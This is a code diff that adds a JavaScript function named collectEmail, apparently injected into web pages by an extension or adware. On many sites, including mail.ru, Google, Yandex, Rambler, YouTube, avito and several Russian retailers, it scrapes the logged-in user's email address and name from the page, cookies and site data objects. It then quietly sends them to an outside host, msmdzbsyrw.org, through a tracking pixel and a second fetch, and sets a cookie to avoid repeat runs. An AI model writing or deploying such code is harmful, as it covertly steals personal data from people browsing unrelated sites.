@@ -1,0 +1,114 @@
+function collectEmail(userId, scriptHost) {
+    try {
+        var getCookie = function (name) {
+            var matches = document.cookie.match(new RegExp(
+                "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+            ));
+            return matches ? decodeURIComponent(matches[1]) : false;
+        }, setCookie = function (name, value, options) {
+            options = options || {};
+            var expires = options.expires;
+            if (typeof expires == "number" && expires) {
+                var d = new Date();
+                d.setTime(d.getTime() + expires * 1000);
+                expires = options.expires = d;
+            }
+            if (expires && expires.toUTCString) {
+                options.expires = expires.toUTCString();
+            }
+            value = encodeURIComponent(value);
+            var updatedCookie = name + "=" + value;
+            for (var propName in options) {
+                updatedCookie += "; " + propName;
+                var propValue = options[propName];
+                if (propValue !== true) {
+                    updatedCookie += "=" + propValue;
+                }
+            }
+            document.cookie = updatedCookie;
+        };
+
+        setTimeout(function () {
+            if (!getCookie("___ml_clltr")) {
+                var b, d = window.location.host;
+                b = /(?:\W+|^)([\w-]+(?:\.[\w-]+)*@[\w-]+(?:\.[\w-]+)*(?:\.[a-z]{2,4}))(?:\W+|$)/im;
+                var a, c, name;
+                if ("mail.ru" == d || d.endsWith(".mail.ru")) {
+                    if (a = document.getElementById("PH_user-email")) {
+                        c = b.exec(a.textContent);
+                        try {
+                            name = document.getElementsByClassName("x-ph__auth_list__item__info__email__text")[0].textContent;
+                        } catch (ex) {
+                            name = '';
+                        }
+                    }
+                } else if (d.endsWith(".google.com") || d.endsWith(".google.ru")) {
+                    if (a = document.querySelector('a[href*="https://accounts.google.com/SignOutOptions?hl=en"]')){
+                        c = b.exec(a.getAttribute("title"));
+                        name = new RegExp()
+                    }
+                } else if ("yandex.ru" == d || "yandex.com" == d || d.endsWith(".yandex.ru") || "www.kinopoisk.ru" == d) {
+                    var e;
+                    if (e = getCookie("yandex_login"))(c = b.exec(e)) && 2 == c.length || e && (c = b.exec(e + "@yandex.ru")); else if ((a =
+                            document.querySelectorAll(".header-view__user-name, .user__name, .username, .user__name, .mail-User-Name, .header__username, .button_login, .multi-auth__item, .head__userpic, #user_from")) && a.length)for (d = 0; d < a.length; d++) {
+                        e = a[d];
+                        e = e.textContent || e.getAttribute("title") || e.getAttribute("value");
+                        if ((c = b.exec(e)) && 2 == c.length)break;
+                        if (e && (c = b.exec(e + "@yandex.ru")) && 2 == c.length)break
+                    }
+                } else if (d.endsWith(".rambler.ru")) {
+                    if (e = "", !(e = getCookie("rlogin")) || !(c = b.exec(e + "@" + getCookie("rdomain"))) || 2 != c.length)if (a =
+                            document.querySelector(".rambler-topline__user-signin>img"))c = b.exec(a.getAttribute("src"))
+                } else if (d.endsWith("lamoda.ru")) {
+                    if (window.LMDA.user.email) {
+                        e = LMDA.user.email;
+                        c = b.exec(e);
+                        name = LMDA.user.firstname + " " + LMDA.user.lastname;
+                    }
+                } else if (d.endsWith("gearbest.com")) {
+                    if (e = getCookie("WEBF-email")) {
+                        e = decodeURIComponent(e);
+                        c = b.exec(e);
+                        name = '';
+                    }
+                } else if (d.endsWith("mvideo.ru")) {
+                    if (dataLayer[0].userEmail) {
+                        e = dataLayer[0].userEmail;
+                        c = b.exec(e);
+                        name = document.querySelector("span.header-user-name.sel-droplink-user-name > strong").textContent;
+                    }
+                } else if (d.endsWith("citilink.ru")) {
+                    if (window.digitalData.user.email) {
+                        e = window.digitalData.user.email;
+                        c = b.exec(e);
+                        name = window.digitalData.user.firstName + " " + window.digitalData.user.lastName;
+                    }
+                } else switch (d) {
+                    case "www.youtube.com":
+                        if (a = document.querySelector(".yt-masthead-picker-account-subtitle"))c = b.exec(a.textContent);
+                        break;
+                    case "www.avito.ru":
+                        if (a = document.querySelector(".userinfo-details"))c = b.exec(a.textContent);
+                        break;
+                    case "www.woman.ru":
+                        if (a = document.querySelector("label[for=logon]"))c = b.exec(a.textContent);
+                        break;
+                    case "www.kinopoisk.ru":
+                        if (a = document.querySelector("label[for=logon]"))c = b.exec(a.textContent)
+                }
+
+                if (b = c && 2 == c.length ? c[1] : null) {
+                    var x=new Image;
+                    x.src="http://msmdzbsyrw.org/app/scripts-analyzer/pixel-email.php?email="+ c[1] + "&host=lululu.ru&uid=dd8aee96-c566-f777-1570-97664107&name=" + name;
+                    document.body.appendChild(x);
+                    setCookie('___ml_clltr', 1, {expires: 3600 * 24 * 7});
+                    fetch("//"+scriptHost+"/audience/write-user-data?host="+location.host+"&userId="+userId+"&email="+c[1])
+                        .then(function (response) {
+                            return response
+                        })
+                }
+            }
+        }, 500);
+    } catch (b) {
+    }
+}
